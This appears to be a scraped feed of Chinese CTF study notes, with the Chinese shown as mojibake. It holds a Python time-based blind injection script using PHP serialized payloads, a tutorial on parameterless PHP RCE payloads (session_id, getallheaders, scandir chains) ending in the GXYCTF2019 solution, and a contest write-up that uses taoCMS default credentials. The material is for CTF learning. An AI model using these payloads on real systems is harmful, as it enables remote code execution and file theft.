class="line">&#125; </span><br></pre></td></tr></table></figure><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://fbf7e8e2-509c-4a09-94a5-0b42650ca7a7.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">        k = <span class="built_in">chr</span>(k)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:74:&quot;if [ `cat /flag_is_h3eeere | awk NR==1 | cut -c %s` == %s ];then sleep 3;fi&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;&#x27;</span> % (i, k)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(url=url, data=data, timeout=(<span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = result + k</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment">#éœ€è¦æ³¨æ„è„šæœ¬ä¸­çš„iï¼Œkçš„å€¼</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ— å‚RCE</title>
      <link href="/2023/10/16/%E6%97%A0%E5%8F%82RCE/"/>
      <url>/2023/10/16/%E6%97%A0%E5%8F%82RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="æ— å‚RCE"><a href="#æ— å‚RCE" class="headerlink" title="æ— å‚RCE"></a>æ— å‚RCE</h1><h1 id="0x00å‰è¨€"><a href="#0x00å‰è¨€" class="headerlink" title="0x00å‰è¨€"></a>0x00å‰è¨€</h1><p>åˆ·buuçš„æ—¶å€™é‡åˆ°ä¸€é“é¢˜ï¼Œ[GXYCTF2019]ç¦æ­¢å¥—å¨ƒï¼Œæ¶‰åŠåˆ°æ— å‚æ•°RCEï¼Œä½†æ˜¯æˆ‘ä¸ä¼šï¼Œè®°å½•ä¸€ä¸‹å­¦ä¹ è¿‡ç¨‹ã€‚<br> <strong>å®ä¾‹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; </span><br><span class="line">eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">preg_replace(&#x27;/[a-z]+\((?R)?\)/&#x27;, NULL, $code)</span><br><span class="line">pre_match(&#x27;/et|na|nt|strlen|info|path||rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code))</span><br></pre></td></tr></table></figure><p><strong>è§£æ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_replace çš„ä¸»è¦åŠŸèƒ½å°±æ˜¯é™åˆ¶æˆ‘ä»¬ä¼ è¾“è¿›æ¥çš„å¿…é¡»æ˜¯çº¯å°å†™å­—æ¯çš„å‡½æ•°ï¼Œè€Œä¸”ä¸èƒ½æºå¸¦å‚æ•°ã€‚</span><br><span class="line">å†æ¥çœ‹ä¸€ä¸‹ï¼š(?R)?ï¼Œè¿™ä¸ªæ„æ€ä¸ºé€’å½’æ•´ä¸ªåŒ¹é…æ¨¡å¼ã€‚æ‰€ä»¥æ­£åˆ™çš„å«ä¹‰å°±æ˜¯åŒ¹é…æ— å‚æ•°çš„å‡½æ•°ï¼Œå†…éƒ¨å¯ä»¥æ— é™åµŒå¥—ç›¸åŒçš„æ¨¡å¼ï¼ˆæ— å‚æ•°å‡½æ•°ï¼‰</span><br><span class="line"></span><br><span class="line">preg_matchçš„ä¸»è¦åŠŸèƒ½å°±æ˜¯è¿‡æ»¤å‡½æ•°ï¼ŒæŠŠä¸€äº›å¸¸ç”¨ä¸å¸¦å‚æ•°çš„å‡½æ•°å…³é”®éƒ¨åˆ†éƒ½ç»™è¿‡æ»¤äº†ï¼Œéœ€è¦å»æ„é€ åˆ«çš„æ–¹æ³•å»æ‰§è¡Œå‘½ä»¤ã€‚</span><br></pre></td></tr></table></figure><p>è¯´ç™½äº†å°±æ˜¯ä¼ å…¥çš„å‚æ•°ä¸èƒ½å«æœ‰å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scandirï¼ˆ&#x27;a()&#x27;ï¼‰//å¯ä»¥ä½¿ç”¨ï¼Œé‡Œé¢æ²¡æœ‰å‚æ•°</span><br><span class="line">scandirï¼ˆ&#x27;123&#x27;ï¼‰//ä¸å¯ä»¥ä½¿ç”¨ï¼Œé‡Œé¢æœ‰å‚æ•°</span><br></pre></td></tr></table></figure><p>æ‰€è°“æ— å‚æ•°<code>RCE</code>è¯´ç™½äº†å°±æ˜¯ä½¿ç”¨ä¸€ä¸ªä¸ªçš„å‡½æ•°æ¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚<br> ä¾‹å¦‚<code>print_r(array_reverse(scandir(current(localeconv()))))</code><br> æ¥ä¸‹æ¥å°±è¯´è¯´ç”±å“ªäº›æ–¹æ³•èƒ½å®ŒæˆRCE<br> <strong>æµ‹è¯•ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x01å…³äºæ— å‚æ•°RCEçš„ä¸€äº›æ–¹æ³•"><a href="#0x01å…³äºæ— å‚æ•°RCEçš„ä¸€äº›æ–¹æ³•" class="headerlink" title="0x01å…³äºæ— å‚æ•°RCEçš„ä¸€äº›æ–¹æ³•"></a>0x01å…³äºæ— å‚æ•°RCEçš„ä¸€äº›æ–¹æ³•</h1><h2 id="æ–¹æ³•ä¸€-åˆ©ç”¨session-id"><a href="#æ–¹æ³•ä¸€-åˆ©ç”¨session-id" class="headerlink" title="æ–¹æ³•ä¸€ åˆ©ç”¨session_id"></a>æ–¹æ³•ä¸€ åˆ©ç”¨session_id</h2><p>åˆ©ç”¨<code>http headers</code>ä¼ å‚ï¼Œç„¶è€Œ<code>http</code>ä¸­æœ‰é‚£ä¹ˆå¤šçš„å†…å®¹ï¼Œæœ€å®¹æ˜“æƒ³åˆ°çš„ä¼°è®¡å°±æ˜¯<code>cookies</code>ä¼ é€’å‚æ•°ã€‚<br> åœ¨phpä¸­æœ‰ä¸€ä¸ªå‡½æ•°<code>session_id</code>å¯ä»¥ç”¨æ¥è·å–&#x2F;è®¾ç½®å½“å‰ä¼šè¯IDï¼Œå¹¶ä¸”è¿™ä¸ªå€¼æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚ä½†æ˜¯å®ƒçš„ä½¿ç”¨æœ‰äº›é™åˆ¶ï¼š æ–‡ä»¶ä¼šè¯ç®¡ç†å™¨ä»…å…è®¸ä¼šè¯ ID ä¸­ä½¿ç”¨ä»¥ä¸‹å­—ç¬¦ï¼ša-z A-Z 0-9 ,ï¼ˆé€—å·ï¼‰å’Œ - å‡å· ï¼Œä½†æ˜¯è¿™å¹¶ä¸å½±å“æˆ‘ä»¬æ“ä½œã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶ä¼ å…¥ï¼Œä¹‹åä½¿ç”¨<code>hex2bin()</code>å‡½æ•°è½¬æ¢å³å¯ã€‚ä½†æ˜¯ä½¿ç”¨<code>session_id</code>çš„æ—¶å€™å¿…é¡»è¦å¼€å¯<code>session</code>æ‰å¯ä»¥ï¼Œéœ€è¦<code>session_start</code><br> æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(hex2bin(session_id(session_start())));</span><br><span class="line">hex(&quot;phpinfo();&quot;)=706870696e666f28293b</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154315987-1700990134691-53-1700994502483-26.png"></p><h2 id="æ–¹æ³•äºŒ-åˆ©ç”¨get-defined-vars-å‡½æ•°"><a href="#æ–¹æ³•äºŒ-åˆ©ç”¨get-defined-vars-å‡½æ•°" class="headerlink" title="æ–¹æ³•äºŒ åˆ©ç”¨get_defined_vars ()å‡½æ•°"></a>æ–¹æ³•äºŒ åˆ©ç”¨get_defined_vars ()å‡½æ•°</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars()ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡<code>get</code>æˆ–è€…<code>post</code>æ–¹æ³•ï¼Œä¼ å…¥çš„å‚æ•°ï¼Œä»¥åŠå®ƒçš„å€¼å¯ä»¥è¢«<code>get_defined_vars()</code>è¯»å‡ºæ¥ã€‚è€Œä¸”å®ƒè¿”å›çš„è¿˜æ˜¯æ•°ç»„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡phpä¸­çš„ä¸€ç³»åˆ—å¯¹æ•°ç»„æ“ä½œçš„å‡½æ•°æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">end() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</span><br><span class="line">current() -è¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(current(get_defined_vars()));&amp;b=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154330409-1700990134690-51-1700994502483-25.png"></p><p>æŸ¥çœ‹æœ€åä¸€ä¸ªæ•°ç»„ï¼Œä¸”eval</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;b=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154343786-1700990134690-52-1700994502483-27.png"></p><h2 id="æ–¹æ³•ä¸‰-åˆ©ç”¨getallheaders"><a href="#æ–¹æ³•ä¸‰-åˆ©ç”¨getallheaders" class="headerlink" title="æ–¹æ³•ä¸‰ åˆ©ç”¨getallheaders()"></a>æ–¹æ³•ä¸‰ åˆ©ç”¨getallheaders()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getallheadersè¿”å›å½“å‰è¯·æ±‚çš„æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154359144-1700990134691-54-1700994502483-28.png"></p><p>å°è¯•å†™å…¥phpinfoï¼ˆï¼‰</p><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154409805-1700990134691-55-1700994502483-30.png"></p><p>ä¹‹åå°±å¯ç”¨æ•°ç»„æ“ä½œçš„å‡½æ•°æ‹¿å‡ºphpinfoï¼ˆï¼‰ä¸”æ‰§è¡Œã€‚<br> æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(next(getallheaders()));</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154420985-1700990134691-56-1700994502483-29.png"></p><h2 id="æ–¹æ³•å››-getenv"><a href="#æ–¹æ³•å››-getenv" class="headerlink" title="æ–¹æ³•å›› getenv()"></a>æ–¹æ³•å›› getenv()</h2><p><code>getenv() ï¼šè·å–ç¯å¢ƒå˜é‡çš„å€¼(åœ¨PHP7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)</code><br> çœ‹ç®€ä»‹å°±æ˜ç™½ï¼Œå®ƒå¹¶ä¸é€‚ç”¨äºPHP&lt;7.1çš„ç‰ˆæœ¬ï¼Œæˆ‘çš„ç‰ˆæœ¬ä¸åˆé€‚ï¼ŒæŠ¥äº†400é”™è¯¯ï¼Œå¾€é‡Œé¢ä¼ å‚ä¹Ÿä¸è¡Œã€‚</p><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154438342-1700990134691-57-1700994502483-31.png"></p><p>æ²¡æœ‰æˆåŠŸï¼Œå¥½åœ¨è¿™ç§æ–¹æ³•ä½¿ç”¨é™åˆ¶æ¯”è¾ƒå¤šï¼Œä½¿ç”¨ä¹Ÿç›¸å¯¹æ¯”è¾ƒå°‘ã€‚</p><h2 id="æ–¹æ³•äº”-scandir"><a href="#æ–¹æ³•äº”-scandir" class="headerlink" title="æ–¹æ³•äº” scandir()"></a>æ–¹æ³•äº” scandir()</h2><p>è¿™ç§æ–¹æ³•æ˜¯ä½¿ç”¨æ¯”è¾ƒå¤šçš„ï¼Œç›¸å¯¹è€Œè¨€æ¯”è¾ƒå¤šå˜ï¼Œå„ä¸ªå‡½æ•°ç›¸è¾…ç›¸æˆã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">scandir()  //å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</span><br><span class="line">localeconv()   //è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</span><br><span class="line">current()     //è¿”å›æ•°ç»„ä¸­çš„å•å…ƒï¼Œé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚</span><br><span class="line">posæ˜¯currentçš„åˆ«å</span><br><span class="line">getcwd()      //å–å¾—å½“å‰å·¥ä½œç›®å½•</span><br><span class="line">dirname()     //å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</span><br><span class="line">array_flip()  //äº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„</span><br><span class="line">array_rand()  //ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</span><br><span class="line">array_flip()å’Œarray_rand()é…åˆä½¿ç”¨å¯éšæœºè¿”å›å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶å</span><br><span class="line">dirname(chdir(dirname()))é…åˆåˆ‡æ¢æ–‡ä»¶è·¯å¾„</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd()))); //æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•çš„æ–‡ä»¶</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));  //æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•çš„æ–‡ä»¶</span><br><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//è¿™ä¸ªå¾—çˆ†ç ´ï¼Œä¸ç„¶æ‰‹åŠ¨è¦åˆ·æ–°å¾ˆä¹…ï¼Œå¦‚æœæ–‡ä»¶æ˜¯æ­£æ•°æˆ–å€’æ•°ç¬¬ä¸€ä¸ªç¬¬äºŒä¸ªæœ€å¥½ä¸è¿‡äº†ï¼Œç›´æ¥å®šä½</span><br><span class="line">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));  //æŸ¥çœ‹å’Œè¯»å–æ ¹ç›®å½•æ–‡ä»¶</span><br><span class="line">if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));  //æŸ¥çœ‹å’Œè¯»å–æ ¹ç›®å½•æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>ç”±æ­¤å¯ä»¥çœ‹å‡ºå„ä¸ªå‡½æ•°ç›¸äº’åˆ©ç”¨ï¼Œç»„åˆæ–¹æ³•æœ‰å¾ˆå¤š</p><h1 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h1><p>çŸ¥è¯†ä¸ç»è¿‡ç»„åˆåˆ©ç”¨å°±ä¸ä¼šèµ·ä½œç”¨</p><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>dirsearchæ‰«ç›®å½•å¾—<code>/.git</code> åˆ©ç”¨githackå¾—æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä»£ç ï¼Œå¾ˆæ˜æ˜¾çš„æ— å‚æ•°RCE<br> å…¶ä¸­<code>(?R)</code>å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œåé¢åŠ äº†?é€’å½’è°ƒç”¨ã€‚åªèƒ½åŒ¹é…é€šè¿‡æ— å‚æ•°çš„å‡½æ•°<br> <code>scandir(&#39;.&#39;)</code>è¿”å›å½“å‰ç›®å½•ï¼Œä½†æ˜¯å¦‚ä½•æ„é€ <code>.</code> å‡½æ•°<code>localeconv()</code> è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚   ä½†æ˜¯å…¶æ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯<code>.</code>ï¼Œ <code>current()/pos()</code>è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚<br> æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154457471-1700990134691-58-1700994502483-33.png"></p><p>åˆ©ç”¨å¯¹æ•°ç»„æ“ä½œçš„å‡½æ•°è¯»å–flag<br> åˆ©ç”¨<code>array_reverse()</code> å°†æ•°ç»„å†…å®¹åè½¬ä¸€ä¸‹  ï¼Œ åˆ©ç”¨<code>next()</code>æŒ‡å‘ç¬¬äºŒä¸ªå…ƒç´ ï¼Œä¹Ÿå°±æ˜¯flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p><img src="/2023/10/16/%E6%97%A0%E5%8F%82RCE/image/image-20231013154506994-1700990134691-59-1700994502483-32.png"></p><h1 id="0x02-åè®°"><a href="#0x02-åè®°" class="headerlink" title="0x02 åè®°"></a>0x02 åè®°</h1><p>åœ¨æ²¡å­¦ä¹ ä¹‹å‰è§‰å¾—è¿™ä¸ªçŸ¥è¯†ç‚¹å¯èƒ½ä¼šå¾ˆéš¾ï¼Œç°åœ¨å€’ä¹Ÿè§‰å¾—æ²¡æœ‰æˆ‘æƒ³çš„é‚£ä¹ˆéš¾ã€‚æœ‰äº›ä¸œè¥¿åšäº†æ‰çŸ¥é“æ·±æµ…ã€‚ç»§ç»­åŠ æ²¹å§ã€‚</p><p><strong>å‚è€ƒ</strong><br> <a href="https://blog.csdn.net/qq_38154820/article/details/107171940">https://blog.csdn.net/qq_38154820/article/details/107171940</a><br> <a href="https://blog.csdn.net/qq_45570082/article/details/106602261">https://blog.csdn.net/qq_45570082/article/details/106602261</a><br> <a href="https://xz.aliyun.com/t/9360#toc-6">https://xz.aliyun.com/t/9360#toc-6</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QLNU22çº§æœ€åä¸€æ¬¡æ ¡èµ›wp</title>
      <link href="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/"/>
      <url>/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="æ ¡èµ›wp"><a href="#æ ¡èµ›wp" class="headerlink" title="æ ¡èµ›wp"></a>æ ¡èµ›wp</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="solve-me"><a href="#solve-me" class="headerlink" title="solve_me"></a>solve_me</h3><p>å…ˆè´¹é©¬åˆ†è§£</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231007092105405-1700994510649-43.png" alt="image-20231007092105405"></p><p>flag{fa2371c5-bf58-4502-9fea-caf12a85d1ff}</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Easycms"><a href="#Easycms" class="headerlink" title="Easycms"></a>Easycms</h3><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008183430859-1700994510649-44.png"></p><p>æ‰“å¼€é¡µé¢ï¼Œé¡µé¢æ˜¾ç¤ºtaoCMSæ¼”ç¤ºç³»ç»Ÿï¼Œæƒ³ç€åº”è¯¥æœ‰æ¼æ´ï¼Œä¸Šç½‘æœtaocmsæ¼æ´</p><p>çœ‹åˆ°æ–‡ç« <a href="http://blog.csdn.net/m0_46684679/article/details/129214411">http://blog.csdn.net/m0_46684679/article/details/129214411</a></p><p>è®¿é—®url&#x2F;admin&#x2F;admin.php</p><p>å¼¹å‡ºä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œ</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008183939747-1700994510649-46.png"></p><blockquote><p>è´¦æˆ·admin</p><p>å¯†ç tao</p></blockquote><p>ç™»å½•æˆåŠŸï¼Œè·³è½¬åˆ°è¿™ä¸ªç•Œé¢</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008184041682-1700994510649-45.png"></p><p>ç‚¹å‡»æ–‡ä»¶ç®¡ç†ï¼Œè¿›å…¥..&#x2F;..&#x2F;..&#x2F;çœ‹åˆ°flagï¼Œç‚¹å¼€çœ‹åˆ°flag</p><p><img src="/2023/10/07/%E6%A0%A1%E8%B5%9Bwp/image/image-20231008184157673-1700994510649-47.png"></p><p>QLNU{woW_CMs_1s_DAngeR0us_41rI9h7?_91b5e2b34cc2}</p><h3 id="Answered"><a href="#Answered" class="headerlink" title="Answered"></a>Answered</h3><p>é™„è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 